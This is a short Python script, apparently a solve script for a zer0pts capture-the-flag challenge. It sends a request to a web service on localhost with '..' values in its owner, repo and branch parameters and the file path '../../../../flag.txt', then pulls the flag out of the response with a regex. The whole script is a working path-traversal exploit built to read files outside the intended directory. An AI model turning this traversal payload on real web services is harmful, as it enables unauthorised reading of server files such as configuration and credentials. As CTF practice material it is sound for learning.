import os
import requests
import re

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "8001")

r = requests.get(f"http://{HOST}:{PORT}/",
                 params={
                     "service": "https//github/",
                     "owner": "..",
                     "repo": "..",
                     "branch": "..",
                     "file": "../../../../flag.txt"
                 })
print(re.findall("zer0pts\{.+\}", r.text))
